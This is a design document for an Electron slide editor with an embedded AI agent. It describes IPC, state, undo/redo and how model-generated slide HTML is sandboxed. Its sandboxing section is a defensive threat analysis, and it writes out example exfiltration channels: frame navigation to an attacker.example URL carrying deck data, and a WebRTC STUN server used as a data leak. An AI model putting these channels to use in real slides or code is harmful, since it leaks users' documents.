# 10 — Architecture

Process model, IPC, state, undo/redo, `.sloodge` lifecycle, sandboxing, presenter flow.

Scope boundaries: the *content* of a slide document is specified in [30-slide-format.md](30-slide-format.md);
the element-picking/property-panel UX in [40-design-mode.md](40-design-mode.md); agent prompting,
skills, MCP tool catalogue and permissions in [50-agent-integration.md](50-agent-integration.md);
export pipelines in [60-export.md](60-export.md). This doc covers only how the pieces are wired.

---

## 1. Process model

Three code targets, built by electron-vite into `out/main`, `out/preload`, `out/renderer`.

### 1.1 Main process (Node, trusted)

Owns everything that touches the OS, the network, or the user's files. Nothing else in the app may.

| Responsibility | Module |
|---|---|
| App lifecycle, single-instance lock, window creation | `src/main/index.ts`, `src/main/window/mainWindow.ts` |
| Native menu (File / Edit / View / Present) + accelerators | `src/main/menu/appMenu.ts` |
| `.sloodge` read/write, autosave, recovery journal | `src/main/document/DocumentService.ts`, `src/main/document/sloodgeFile.ts` |
| Authoritative deck document + command log | `src/main/document/DocumentSession.ts`, `src/main/document/history.ts` |
| Claude Agent SDK session (subprocess owner) | `src/main/agent/AgentService.ts` |
| In-process MCP slide tools | `src/main/agent/tools/*.ts` |
| API key storage via `safeStorage` | `src/main/secrets/KeyStore.ts` |
| Export (printToPDF, capturePage, pptxgenjs) | `src/main/export/*` |
| Presenter window / fullscreen orchestration | `src/main/present/PresentService.ts` |
| Session-level CSP + navigation/permission lockdown | `src/main/security/hardening.ts` |
| Typed IPC router | `src/main/ipc/router.ts` + `src/main/ipc/handlers/*.ts` |

Window `webPreferences` for every window we create:
`{ contextIsolation: true, nodeIntegration: false, sandbox: true, preload: <preload path>, webSecurity: true }`.

### 1.2 Preload (isolated bridge, tiny)

`src/preload/index.ts` exposes exactly one object via `contextBridge.exposeInMainWorld('sloodge', api)`.
No `ipcRenderer` leaks, no dynamic channel names, no Node globals. The API surface is generated from
the shared contract so renderer and main can never drift:

```
src/preload/
  index.ts          # contextBridge.exposeInMainWorld('sloodge', api)
  invoke.ts         # typed invoke<K>(channel, req): Promise<Res>
  subscribe.ts      # typed on<K>(channel, cb): () => void  (returns unsubscribe)
  api.ts            # the concrete object: doc, agent, design, export, present, app
```

`src/preload/slide-preload.ts` is a *second*, near-empty preload used only by the presenter
`WebContentsView` (§8); it exposes nothing but a `postMessage` relay.

### 1.3 Renderer (React 19, untrusted-ish)

Pure UI + local view state. It never reads/writes files, never calls the network, never spawns
anything. It holds a *replica* of the document, not the source of truth.

```
src/renderer/
  main.tsx                     # React root
  app/App.tsx                  # shell layout (PowerPoint frame — see 20-ui-wireframes.md)
  app/routes.tsx               # editor | present-preview (no router lib needed; a mode enum)
  features/
    deck/ThumbnailRail.tsx     # left rail, one <SlideFrame> per slide (lazy, virtualized)
    canvas/SlideCanvas.tsx     # 1280x720 sandboxed iframe + zoom-to-fit wrapper
    canvas/SlideFrame.tsx      # the iframe element + srcdoc/blob plumbing + ready handshake
    designmode/…               # see 40-design-mode.md
    chat/ChatPanel.tsx         # transcript, composer, stop button, cost meter
    chat/messages/*            # assistant text, tool-call cards, AskUserQuestion card
    format/FormatBar.tsx       # top text-formatting tab
    statusbar/StatusBar.tsx    # slide n/N, zoom, Present button
  stores/                      # Zustand (§4)
  ipc/client.ts                # thin wrappers over window.sloodge + event fan-in
  ipc/useAgentStream.ts        # subscribes agent events -> chatStore
  components/ui/*              # shadcn/ui primitives
  styles/globals.css           # Tailwind v4 (@import "tailwindcss")
```

### 1.4 Shared contract

```
src/shared/
  ipc-contract.ts   # channel name -> { req, res } and event name -> payload (source of truth)
  document.ts       # SloodgeDoc, Slide, DeckTheme types (mirrors 30-slide-format.md)
  commands.ts       # DocCommand union + CommandResult (§5)
  agent-events.ts   # AgentEvent union (normalized SDKMessage projection)
  errors.ts         # SloodgeError codes, serializable across IPC
  ids.ts            # slide/element id helpers
```

`src/shared` is imported by all three targets and must stay dependency-free (types + pure helpers only).

---

## 2. Typed IPC design

One contract file, two generic helpers, zero stringly-typed calls.

```ts
// src/shared/ipc-contract.ts
export type IpcRequests = {
  'doc:new':        { req: { template?: string };              res: DocSnapshot };
  'doc:open':       { req: { path?: string };                  res: DocSnapshot | null }; // null = user cancelled
  'doc:save':       { req: { saveAs?: boolean };               res: { path: string } };
  'doc:apply':      { req: { commands: DocCommand[]; origin: CommandOrigin }; res: CommandResult };
  'doc:undo':       { req: {};                                 res: CommandResult };
  'doc:redo':       { req: {};                                 res: CommandResult };
  'doc:recovery':   { req: { action: 'restore' | 'discard' };  res: DocSnapshot | null };
  'agent:send':     { req: { text: string; attachments?: Attachment[]; context?: ElementContext };
                      res: { turnId: string } };
  'agent:interrupt':{ req: {};                                 res: void };
  'agent:answer':   { req: { requestId: string; answer: PermissionAnswer }; res: void };
  'agent:setKey':   { req: { apiKey: string };                 res: { ok: true } };
  'export:run':     { req: ExportRequest;                      res: ExportResult };
  'present:start':  { req: { fromSlide: number; display?: number }; res: void };
  'present:stop':   { req: {};                                 res: void };
  'present:goto':   { req: { index: number; step?: number };   res: void };
};

export type IpcEvents = {
  'doc:changed':    DocPatch;            // authoritative doc delta -> renderer replica
  'doc:dirty':      { dirty: boolean; lastSavedAt: number | null };
  'agent:event':    AgentEvent;          // normalized stream (§3)
  'agent:ask':      PermissionRequest;   // canUseTool / AskUserQuestion round-trip
  'present:state':  { index: number; step: number; elapsedMs: number };
  'export:progress':{ jobId: string; done: number; total: number; phase: string };
  'app:menu':       MenuAction;          // native menu -> renderer (e.g. 'file.new'; Edit items are roles, not events)
};
```

Rules:

1. **Request/response uses `ipcRenderer.invoke` only** — no `send`+reply pairs, no sync IPC.
2. **Every handler is registered through `src/main/ipc/router.ts`**, which wraps the handler in
   (a) zod validation of `req`, (b) try/catch → `SloodgeError` serialization, (c) an
   `event.senderFrame` origin check so a compromised slide iframe cannot reach IPC (it has no
   preload anyway, but defence in depth).
3. **Events are one-way main→renderer**, delivered on a fixed allow-list of channel names. The
   preload's `subscribe.ts` refuses any channel not in `IpcEvents`.
4. **Nothing structured-clone-hostile crosses IPC**: no functions, no Buffers larger than ~1 MB
   (large PNG/PDF payloads are written to disk in main and only a path is returned).
5. Errors are values: handlers return `{ ok: true, data }` / `{ ok: false, error }`; `ipc/client.ts`
   unwraps and throws a typed `SloodgeError` in the renderer.

---

## 3. Where the Agent SDK runs, and how streaming reaches the renderer

The SDK spawns a native `claude` CLI subprocess over stdio (see `research/claude-agent-sdk.md` §1,
§16), so it **must** live in the main process. It runs in `src/main/agent/AgentService.ts` in
**streaming-input mode** — one long-lived `query()` per open deck, so `interrupt()`,
image attachments and mid-session control are available.

```
src/main/agent/
  AgentService.ts      # lifecycle: start/stop/interrupt, one session per DocumentSession
  chatBridge.ts        # queue -> AsyncGenerator<SDKUserMessage> (the "send" side)
  streamProjector.ts   # SDKMessage -> AgentEvent (drop noise, dedupe usage by message.id)
  permissions.ts       # canUseTool -> 'agent:ask' round-trip; AskUserQuestion handling
  hooks.ts             # PreToolUse hard invariants (workspace jail, no Bash/Write outside)
  workspace.ts         # per-deck cwd under userData, skills staged into .claude/skills
  tools/               # createSdkMcpServer('slides', …) — catalogue in 50-agent-integration.md
```

Flow:

```
ChatPanel.submit()
  → sloodge.agent.send({text, context})            (invoke 'agent:send')
  → AgentService.enqueue()  → chatBridge queue     (resolves the pending generator promise)
  → SDK subprocess turn begins
  → for await (msg of query) → streamProjector     → win.webContents.send('agent:event', ev)
  → useAgentStream() → chatStore.applyEvent()      → React re-render (token-by-token)
```

Details that matter:

- `includePartialMessages: true` gives `stream_event` deltas so assistant text types out live.
  The projector coalesces deltas on a ~30 ms rAF-ish timer before sending, so we emit ~30 IPC
  messages/sec instead of hundreds.
- `AgentEvent` is a *narrow projection*, not raw `SDKMessage`: `{kind:'text-delta'|'text-end'|
  'tool-start'|'tool-end'|'thinking'|'usage'|'turn-end'|'error', …}`. The renderer never sees SDK
  types, so an SDK upgrade cannot break the UI contract.
- **Tool calls mutate the document in main, not in the renderer.** An MCP tool handler builds a
  `DocCommand[]`, pushes it through the same `DocumentSession.apply()` path as a human edit
  (§5), and the resulting `doc:changed` patch reaches the renderer independently of the chat
  stream. The chat shows *narrative*; the canvas updates from *document patches*. These are two
  separate channels on purpose — a stalled chat stream never freezes the canvas.
- `canUseTool` and `AskUserQuestion` are implemented as a promise parked in a
  `Map<requestId, resolve>`; main emits `agent:ask`, the renderer renders a card in the chat, and
  `agent:answer` resolves it. The callback may stay pending indefinitely — that is fine and
  documented SDK behaviour.
- Isolation (from the research doc's hosting guidance): `settingSources: []` for settings, skills
  staged into the per-deck workspace and enabled with `settingSources: ['project']`,
  `CLAUDE_CONFIG_DIR = <userData>/claude`, `CLAUDE_CODE_DISABLE_AUTO_MEMORY=1`,
  `env: { ...process.env, ANTHROPIC_API_KEY }`. The API key is read from `safeStorage` in main and
  **never** crosses to the renderer (the renderer only ever sends a key *in*, and reads a boolean
  `hasKey`).
- Packaging: the SDK's platform binary is `asarUnpack`ed and, if resolution fails,
  `pathToClaudeCodeExecutable` is set explicitly at startup by `agent/locateBinary.ts`.
- Teardown: `q.close()` on `window.close` and `app.before-quit`; `maxTurns` + `maxBudgetUsd` bound
  every session; `interrupt()` backs the Stop button.

---

## 4. State management

Three tiers, with one authority per piece of state.

| State | Authority | Replica |
|---|---|---|
| Deck document (slides, HTML, theme, notes) | main — `DocumentSession` | renderer `docStore` |
| Undo/redo history | main — `history.ts` | renderer holds only `{canUndo, canRedo, labels}` |
| File path / dirty / autosave status | main — `DocumentService` | renderer `docStore.meta` |
| Chat transcript, streaming buffers, cost | main appends to session log; renderer accumulates | renderer `chatStore` |
| Selection, zoom, design-mode state, panel sizes | renderer only | — |
| Agent session id, API key presence | main | renderer flag only |

Why main is the authority: the agent mutates the document from main, exports read it from main, and
autosave/recovery must be correct even if the renderer crashes or is mid-render. A renderer-owned
document would need a second sync path for every AI edit.

### Zustand stores (`src/renderer/stores/`)

```
docStore.ts      # slides[], theme, meta{path,dirty,lastSavedAt}, canUndo/canRedo
                 # mutated ONLY by applyPatch(DocPatch) from 'doc:changed'
                 # actions are thin: they call ipc doc:apply and await the patch
selectionStore.ts# currentSlideIndex, selectedElementId, multi-select set, clipboard ref
uiStore.ts       # zoom, mode: 'edit'|'design'|'present', panel widths, theme (app chrome)
chatStore.ts     # messages[], streaming buffer, pendingAsk, turnState, sessionCostUsd
designStore.ts   # hover/selected element metrics, overlay rects, pending property edits
                 #   (see 40-design-mode.md for semantics)
exportStore.ts   # active jobs + progress
presentStore.ts  # mirrored presenter state when the editor window acts as the console
```

Conventions:

- Stores are created with `create<T>()(subscribeWithSelector(immer(...)))`. `immer` keeps patch
  application readable; `subscribeWithSelector` lets `SlideFrame` react to *only* its slide's HTML
  changing, which is what keeps slide switching under 100 ms.
- No store imports another store's hook; cross-store effects live in
  `src/renderer/stores/effects.ts` (e.g. "when currentSlideIndex changes, prefetch neighbour
  thumbnails").
- Persisted UI prefs (zoom, panel widths, last window bounds) use Zustand `persist` into
  `localStorage`; nothing document-related is ever persisted in the renderer.
- Selectors are colocated (`selectCurrentSlide(state)`) and used with `useShallow` to avoid
  re-rendering the whole shell on every token delta.

### Document patches

`doc:changed` carries a `DocPatch = { rev: number; ops: PatchOp[] }` where `PatchOp` is a small
tagged union (`slide-insert`, `slide-remove`, `slide-move`, `slide-html`, `slide-meta`,
`theme-set`, `deck-meta`). `rev` is a monotonic document revision; the renderer drops any patch
whose `rev !== localRev + 1` and calls `doc:resync` to re-fetch a full snapshot. This makes the
replica self-healing without needing a CRDT.

---

## 5. Undo/redo: command pattern over document mutations

Every mutation — human, design-mode, or AI — is expressed as a `DocCommand` and applied through one
funnel. Nothing may mutate `DocumentSession.doc` directly.

```ts
// src/shared/commands.ts
export type DocCommand =
  | { t: 'slide.insert';  at: number; slide: Slide }
  | { t: 'slide.remove';  id: SlideId }
  | { t: 'slide.move';    id: SlideId; to: number }
  | { t: 'slide.setHtml'; id: SlideId; html: string }
  | { t: 'slide.patchHtml'; id: SlideId; edits: SpanEdit[] }   // byte-span edits, 40-design-mode.md
  | { t: 'slide.setNotes'; id: SlideId; notes: string }
  | { t: 'deck.setTheme'; theme: DeckTheme }
  | { t: 'deck.setMeta';  meta: Partial<DeckMeta> };

export type CommandOrigin =
  | { kind: 'user'; label: string }                 // "Delete slide"
  | { kind: 'design'; label: string; elementId: string }
  | { kind: 'agent'; turnId: string; toolUseId: string };
```

### The funnel

`DocumentSession.apply(commands, origin)` in `src/main/document/DocumentSession.ts`:

1. Validate each command against current state (unknown slide id → reject the whole batch).
2. Compute the **inverse** batch (`invert(cmd, preState)` in `src/main/document/invert.ts`) —
   every command type has a total inverse; `slide.setHtml`'s inverse carries the previous HTML,
   `slide.patchHtml`'s inverse carries the reversed spans.
3. Apply forward, bump `rev`, produce a `DocPatch`.
4. Push `{ forward, inverse, origin, label, rev, ts }` onto the undo stack as **one
   `HistoryEntry`**; clear the redo stack.
5. Emit `doc:changed` + `doc:dirty`, schedule autosave.

Undo = apply `inverse` (without pushing a new entry) and move the entry to the redo stack. Redo =
apply `forward` again. Both re-emit `doc:changed`, so the renderer replica stays correct with no
special-case code.

### Transactions — the part that makes AI edits sane

`history.ts` exposes `beginTransaction(label)` / `commit()` / `abort()`. While a transaction is
open, applied batches are appended to the open entry instead of creating new ones.

- **A full agent turn is one transaction.** `AgentService` opens it on the first mutating tool call
  of a turn and commits it on `turn-end`. So a prompt that rewrites three slides and retints the
  theme is a **single Ctrl+Z**, labelled `AI: "make it more corporate"` (the label is the user's
  prompt, truncated). This is the behaviour users expect and the reason we don't rely on the SDK's
  `rewindFiles()` — our undo unit is the document command log, not the filesystem.
- If the turn errors or the user hits Stop mid-way, the transaction is **committed, not aborted**
  (partial work is kept and remains undoable). `abort()` is reserved for tool-level validation
  failures where the partial state is invalid.
- Design-mode drags coalesce: consecutive `slide.patchHtml` commands with the same
  `origin.elementId` and the same property within 500 ms merge into the open entry
  (`shouldCoalesce(prev, next)`), so dragging a title produces one undo step, not forty.
- Undo history is **per document**, capped at 200 entries (older entries dropped, with a soft cap on
  total retained HTML bytes ~64 MB), and cleared on `doc:open`. It is *not* persisted to `.sloodge`
  in v1; the recovery journal (§6) covers crash survival, not history survival.

### Menu wiring

The native Edit menu's Undo/Redo call main-side handlers directly (no renderer round-trip) and are
enabled/disabled from `history.canUndo/canRedo`. The renderer also binds Ctrl/⌘+Z / Shift+Ctrl/⌘+Z,
but *only* when focus is not inside a text input that has its own native undo.

---

## 6. `.sloodge` file lifecycle

Container format and slide-HTML contract: [30-slide-format.md](30-slide-format.md). Here, only the
lifecycle.

**Open.** `dialog.showOpenDialog` → `sloodgeFile.read(path)` → validate → construct a
`DocumentSession` → return a full `DocSnapshot` to the renderer → `AgentService.start()` with
`cwd = workspaceFor(path)` and, if the file records a `sessionId`, `resume: sessionId` so the chat
thread survives reopening. Add to the recent-files list (`app.addRecentDocument` + our own JSON).

**Save.** Atomic, always: write to `<path>.tmp` → `fsync` → `fs.rename` over the original. Rename is
atomic on both NTFS and APFS, so a crash mid-save can never truncate the user's deck.
`doc:save {saveAs}` prompts when there is no path yet. Saving clears `dirty` and stamps
`lastSavedAt`.

**Autosave.** `DocumentService` runs a debounced autosave: 2 s after the last mutation, and at most
every 30 s under continuous edits. If the document has a path, autosave performs a real atomic save
(this is what most users expect). If it is untitled, autosave writes only to the recovery journal.

**Recovery journal.** `<userData>/recovery/<docId>/` holds:

```
manifest.json      # docId, original path, rev, ts, app version, clean-exit flag
snapshot.sloodge   # last full snapshot written by autosave
journal.ndjson     # DocCommand batches applied since that snapshot (append-only, fsync'd)
```

On mutation we append the command batch to `journal.ndjson` (cheap); every autosave tick we
rewrite `snapshot.sloodge` and truncate the journal. A clean quit sets `cleanExit: true` and
deletes the directory. On startup, `recovery/scan.ts` finds any directory without `cleanExit` and
the renderer shows a "Recover unsaved changes?" bar; `doc:recovery {restore|discard}` either
replays `snapshot + journal` into a `DocumentSession` (marked dirty, path preserved) or deletes it.

**Per-deck workspace.** `<userData>/workspaces/<docId>/` is the agent's `cwd`: staged skills under
`.claude/skills/`, generated assets, scratch renders. It is *derived* state — deleting it costs
nothing but the agent's file scratchpad; the `.sloodge` file remains the only artifact that matters.

**External change.** We `fs.watch` the open file; if it changes on disk while we hold unsaved edits,
the status bar warns and Save switches to a "overwrite / save a copy" prompt. No silent clobbering.

---

## 7. Sandboxing & CSP for AI-generated slide HTML

Slide HTML is **semi-untrusted**: model-generated, executes JS, and may be pasted in from anywhere.
It is contained at four layers.

**Layer 1 — the host renderer is already hostile ground.** `contextIsolation: true`,
`nodeIntegration: false`, `sandbox: true`. Session-level CSP installed in
`src/main/security/hardening.ts` via `onHeadersReceived`, plus a `<meta>` CSP in `index.html`:

```
default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
img-src 'self' data: blob:; font-src 'self' data:; connect-src 'self';
frame-src blob: slide:; object-src 'none'; base-uri 'none'; form-action 'none';
```

`frame-src` is the one directive M2.0 had to widen, and the one CSP decision `slide://` delivery does
*not* escape: it governs the embedder's choice of what may be framed. It grants the slide nothing.
`slide:` appears in no other directive — a unit test asserts exactly that, because listing it under
`default-src` or `script-src` would let the *app* page load code from the scheme that serves
model-generated documents.

> **`frame-src` is containment, not just embedding (measured, M2.0).** It governs **every navigation
> of a child frame**, not merely its initial `src`. That makes this list — and not anything in main —
> what stops a *running* slide from exfiltrating by navigating itself to
> `https://attacker.example/?d=<deck>`. Nothing on the slide's own policy covers that channel:
> `connect-src 'none'` is about fetch/XHR/beacon, no shipped CSP directive governs a frame navigating
> itself (`navigate-to` was specified and dropped), and the sandbox only withholds navigation of the
> *top* frame.
>
> Proven both ways by [`slide-protocol-smoke.mjs`](../../../experiments/init/harness/slide-protocol-smoke.mjs)
> probe 6, which points a slide at a real HTTP listener on loopback: nothing arrives as shipped, and
> temporarily adding `http:` to `frame-src` makes `/exfil?d=deck-contents` land. So `frame-src` is a
> **closed allow-list of the two delivery transports** and must stay one; a `*` or an `https:` added
> here later would silently reopen the channel. `'self'` was removed from it in M2.0 for the same
> reason — the app frames slides and nothing else, and it would have let a slide navigate its frame
> to the app's own document.
>
> An Electron-side `will-frame-navigate` guard was written for this and then deleted: measurement
> showed it does not fire for a renderer-initiated subframe navigation on Electron 43 (emitted for
> the frame's initial `slide://` load, absent for its subsequent `http://` one, while
> `did-start-navigation` saw both). Keeping a guard that never runs would have obscured the real
> mechanism.

Also in `hardening.ts`: `webContents.setWindowOpenHandler(() => ({action:'deny'}))`, a
`will-navigate` guard that blocks any navigation away from the app origin, and
`session.setPermissionRequestHandler` denying everything (camera/mic/geolocation/notifications) for
the app session.

**Layer 2 — the iframe.** Each slide renders in
`<iframe sandbox="allow-scripts" referrerpolicy="no-referrer" allow="" src={slideUrl}>`.
Critically **`allow-same-origin` is omitted**, so the frame is an opaque origin: it cannot read
`window.parent`, cannot touch `localStorage`, cannot reach any app IPC. `allow-popups`,
`allow-top-navigation`, `allow-forms`, `allow-modals` are all omitted too.

Content is delivered over a **URL** rather than `srcdoc` (a real navigation keeps the frame in its own
opaque origin cleanly, gives DevTools a real document URL for Design Mode debugging, and avoids
HTML-escaping the whole document into an attribute). As of M2.0 that URL is a `slide://` one under
Electron and a blob URL in a plain-browser host; either way it is released when the slide unmounts or
its html changes. As of M8.2 the `slide://` URL is `slide://<host>/<id>/` — the host names a
*process group* chosen per surface (`stage-<id>`, one per document, for the canvas stage, Present
and export; one shared `thumbnails` for the rail), not an identity; see the M8.2 note below for why.

> **Correction (M1.3, 2026-07-31) — blob does not escape CSP inheritance.**
> This section was written on the assumption that a blob-loaded frame, unlike `srcdoc`, is governed
> only by the CSP that layer 3 injects. **Tested in Chromium and false.** With the host page
> carrying `script-src 'self'` (as `src/renderer/index.html` does), a `sandbox="allow-scripts"`
> iframe pointed at a `text/html` blob URL has its inline `<script>` **blocked** — *"Executing
> inline script violates the following Content Security Policy directive 'script-src 'self''"* —
> identically to a `srcdoc` control. Reproduce with
> [`experiments/init/harness/csp-blob-inheritance.mjs`](../../../experiments/init/harness/csp-blob-inheritance.mjs).
> The cause is HTML's *determine navigation params policy container*: a navigation whose response
> URL uses a **local scheme** — Fetch defines those as `about`, `blob` and `data` — inherits a clone
> of the initiator's policy container, CSP list included.
>
> Consequences:
> - The three reasons above still stand, so **blob delivery stays** for now; it is measurably no
>   worse than `srcdoc`.
> - A slide document is governed by the *intersection* of the host policy and layer 3, so layer 3 is
>   currently a second line of defence rather than the only one.
> - **`capabilities: ["interactive-js"]` did not work** — inline slide JS was blocked whatever the
>   local-scheme delivery. Static, CSS-animated and SMIL-animated slides were unaffected.
> - Unblocking it requires a **non-local scheme**: register `slide://` with `protocol.handle` in the
>   main process and serve slide documents from it. A non-local scheme does not inherit the policy
>   container, so each slide gets a real per-document CSP — layer 3 becomes the only policy on the
>   frame, which also raises the stakes on `wrapSlideHtml`'s anchor being exactly right. Tracked as
>   an M2 prerequisite in [80-roadmap.md](80-roadmap.md).

> **Resolved (M2.0) — `slide://` delivery ships.** Slides are served from a privileged custom scheme
> registered with `protocol.registerSchemesAsPrivileged` (`standard`, `secure`; **not**
> `supportFetchAPI`, `corsEnabled`, `bypassCSP` or `allowServiceWorkers`) and handled by
> `protocol.handle` in `src/main/slide/protocol.ts`. Documents live in an in-memory registry keyed by
> 128-bit CSPRNG ids — never filesystem paths, so the scheme has no path-traversal surface at all —
> published and revoked by the renderer over the typed `slide:publish` / `slide:revoke` channels.
>
> Verified end-to-end in the real app on WSLg by
> [`experiments/init/harness/slide-protocol-smoke.mjs`](../../../experiments/init/harness/slide-protocol-smoke.mjs):
> the *same* slide document with the *same* inline `<script>` in the *same* `sandbox="allow-scripts"`
> frame **runs** over `slide://` and stays **blocked** over `blob:`. `interactive-js` is unblocked.
>
> Consequences for this section:
> - Layer 3 is now the **only** policy on the frame, so it is sent twice — as a
>   `Content-Security-Policy` response header from main *and* as `wrapSlideHtml`'s injected `<meta>`.
>   Neither is decorative; the header is what makes a missed injection survivable.
> - Layer 2's sandbox attribute is now the sole thing between model-authored JS and the app. The
>   smoke probe asserts containment from inside a *running* slide: `parent.document`,
>   `parent.location`, `top.document`, `opener` and `parent.sloodge` are all unreachable and
>   `localStorage` throws `SecurityError`. (Note that a sandboxed `slide://` frame nonetheless
>   reports `location.origin` as `slide://<host>`, not `"null"` — Chromium derives that string from
>   the URL for a `standard:` scheme even when the security origin is opaque. Cosmetic; through M8.1
>   it was the reason the id was the URL host rather than a path segment.)
> - The plain-browser fallback (evidence recorder, happy-dom unit tests) keeps blob delivery and
>   therefore keeps the old limitation; the host gate is in
>   `src/renderer/src/features/canvas/slideUrlFactory.ts`.

**Layer 3 — the slide document's own CSP.** `src/renderer/features/canvas/wrapSlideHtml.ts`
injects immediately after the document's doctype, so the tree builder places it in the implied
`<head>` ahead of all author content (it deliberately does *not* walk the markup looking for a
literal `<head>` — see that module's docstring for the five review rounds that removed the walk):

```
default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline';
img-src data: blob:; font-src data:; media-src data: blob:;
connect-src 'none'; frame-src 'none'; object-src 'none'; base-uri 'none'; form-action 'none';
```

`connect-src 'none'` is the important one for the channels CSP governs — fetch, XHR, WebSocket,
EventSource, `sendBeacon`, and every subresource: with it a slide cannot phone home, exfiltrate deck
content, or pull remote code through any of those. `'unsafe-inline'` for script/style is unavoidable
(the whole point is inline model-authored `<script>`/`<style>`), but with `default-src 'none'` + no
same-origin it buys the attacker nothing beyond their own opaque document. All assets are inlined as
data URIs at document assembly time — see [30-slide-format.md](30-slide-format.md).

> **CSP does not cover WebRTC — layer 3 is CSP *plus* a runtime guard (M2.0).** No CSP directive
> governs WebRTC (`webrtc-src` was proposed and never shipped), so `connect-src 'none'` does nothing
> to a slide that constructs `new RTCPeerConnection({iceServers:[{urls:'stun:attacker'}]})` —
> measured, five real STUN Binding Requests left a running `slide://` slide onto a loopback UDP
> socket, with the attacker controlling the ICE-server host (and, for TURN, `username`/`credential`)
> as an exfiltration primitive. Before M2.0 this was unreachable, because inline slide JS did not
> execute at all; making it execute is the milestone, and it opened this. It is closed by
> `wrapSlideHtml`'s injected bootstrap (`SLIDE_RUNTIME_GUARD`), which defines `RTCPeerConnection`
> (and its `webkit`/`moz` aliases, `RTCDataChannel`, and `WebTransport`) as non-configurable
> `undefined` before author script runs. The `about:blank`-child-frame resurrection bypass fails
> because `frame-src 'none'` forbids the frame and the slide's opaque origin makes any frame it
> created opaque too; the Worker variant fails on `default-src 'none'`. Proven both ways by
> [`slide-protocol-smoke.mjs`](../../../experiments/init/harness/slide-protocol-smoke.mjs) probe 7:
> zero packets with the guard, real STUN packets with it reverted. So the "no network" guarantee is
> CSP **and** the guard, not CSP alone; the other 22 channels swept (fetch/XHR/WebSocket/beacon/
> subresources/self-navigation/window.open/nested frames/…) are all closed by CSP + `frame-src`.

**Layer 4 — the host↔slide protocol.** The only channel is `window.postMessage` between the frame
and `SlideFrame.tsx`, with:

- a fixed message schema validated by zod on receipt,
- an `event.source === iframe.contentWindow` check (origin is `"null"` for opaque frames, so
  source identity is the check that matters),
- a strict allow-list of message kinds: `ready`, `size`, `element-hit`, `element-metrics`,
  `build-step`, `error`.

The agent bootstrap script (`src/renderer/features/canvas/agent-script.ts`, injected into every
slide, distinct from the "agent" SDK — rename to `slide-runtime.ts` in code) implements Design
Mode's hit-testing and the build-step controller inside the frame. It never receives secrets and
never gets a preload.

**Thumbnails** use the same iframe recipe at CSS `transform: scale(0.1125)` with
`pointer-events: none`; since M8.2 a thumbnail is a live frame only while its card is inside the
rail's scroll window (`ThumbnailPreview`, one `IntersectionObserver` for the rail) and a titled
placeholder otherwise. M8.3 replaces the placeholder with a cached bitmap and virtualizes the cards.

> **M8.2 — lazy mounting, and the host is a process group, not an identity.** M8.1 measured the
> shipped app at 105 Electron processes and 1725 MB median PSS for a 100-slide deck, ~450 MB idle
> on the 3-slide starter deck, and unable to open 500 slides at all. Two causes, both structural:
> every slide was mounted at once (the rail held a live frame per slide), and every slide was its
> own `slide://<id>` **site**, so Chromium's site-per-process model (and `IsolateSandboxedIframes`,
> which groups sandboxed frames per site) gave each one a renderer process at ~11–14 MB PSS.
>
> M8.2 changes both. The canvas and Present render through `SlideStage`, which mounts the active
> slide and its ±1 neighbours (hidden, `inert`, pre-warmed *after* the active frame has loaded its
> current document) and nothing else; the rail mounts a frame only for cards in its scroll window.
> And the URL became `slide://<host>/<id>/`, where the host names a **process group per surface**:
> `stage-<id>` for the stage — still one process per document, but the stage holds at most three —
> and one shared `thumbnails` host for the rail. Four shapes were measured with the M8.1 harness on
> the 100-slide deck (all with lazy mounting): the original per-document host *everywhere* — 14
> processes (26 peak while the rail scrolls), 640 MB, 54 ms median switch; **one host for
> everything** — 5 processes, 583 MB, but a **360 ms median / 1.7 s p95 switch**, because a dozen
> animating documents (stage + thumbnails) then share one main thread and a cold slide's parse queues
> behind them; **one host per surface** (`slides` / `thumbnails`, round 0) — 6 processes, 527 MB,
> 38 ms switch, but a hidden neighbour running `while (true) {}` was **measured to freeze the active
> slide** for the whole observation window, in the editor and in Present; and **per-document stage
> host, shared thumbnails host** (round 1, shipped), whose numbers are in `perf/README.md`. The last
> keeps the thumbnails' work off the stage's thread *and* keeps a hung neighbour out of the active
> slide's process, for a few more processes than round 0.
>
> None of the properties in this section depended on the per-document host, and
> `pnpm perf:isolation` (`perf/cli/isolation-probe.ts`) now demonstrates that in the real app for
> the shipped hosts: from inside running slides, `parent.document`, `top.document`,
> `parent.sloodge`, every sibling frame's `document`/`localStorage`/navigation, the slide's own
> `localStorage`/`sessionStorage`/`indexedDB`/`document.cookie`, and `fetch` of its own URL are all
> denied (110 of 110 reaches), the host sees `event.origin === "null"` for every message, and
> `event.source` still resolves each message to exactly one iframe. The same probe then hangs the
> +1 neighbour and asserts the active slide's heartbeat continues. What is given up knowingly, on the
> **thumbnails surface only**: a second line of defence against the `sandbox` attribute ever being
> lost (it is pinned by two tests, and `frame-src 'none'` means no slide can frame a sibling to
> exploit it), and process-level isolation between *miniatures* — a runaway thumbnail freezes the
> other miniatures while its card is in view, until it scrolls out. Slide-to-app isolation is
> unchanged, and a slide can navigate itself between the two surfaces' hosts (perf-only; see the
> residual note in `slide-protocol.ts`). Present's N+1 pre-warm is therefore isolated today; M4.7's
> separate `WebContentsView` remains the answer for isolating Present from the *editor* renderer.

**Present mode** promotes the active slide to a `WebContentsView` (§8) for process-level fault
isolation — a slide that hangs its JS must not freeze the app during a talk.

---

## 8. Presenter / fullscreen flow

> **Status (M4.1 shipped a same-window overlay, not the separate-window PresentService below).**
>
> **What shipped in M4.1** is a *same-window React overlay* in the editor renderer
> (`src/renderer/src/features/present/PresentSurface.tsx`), not a main-owned `PresentService`. It
> renders the active slide through the **same** sandboxed `SlideFrame` / `slide://` delivery the
> editor canvas uses (no second render path — the `allow-scripts` sandbox and per-document CSP hold
> exactly as in edit view, so animations and interactive JS run live), scaled to fill the window
> letterboxed at 16:9 in CSS via `fitSlide`. Real, borderless OS fullscreen is the one main-process
> capability the renderer cannot do for itself, so it is reached through a single typed,
> runtime-validated IPC seam — `present:setFullscreen` → `BrowserWindow.setFullScreen` on the
> requesting `event.sender` (`src/main/present/{presentFullscreen,install}.ts`). A host without that
> bridge (a plain browser, the static-preview screen recording, unit tests) degrades to a maximized
> black overlay. The pure navigation/blank state machine and the auto-hiding controls live in
> `src/renderer/src/features/present/{presentMachine,controlsAutoHide}.ts`.
>
> **Why the overlay for M4.1.** The v1 wireframe (20-ui-wireframes.md § Present mode) imposes *no*
> window-model requirement — it asks only for a scaled slide with live animations/interactivity,
> keyboard nav, and auto-hiding controls, all of which the overlay meets. Keeping presentation logic
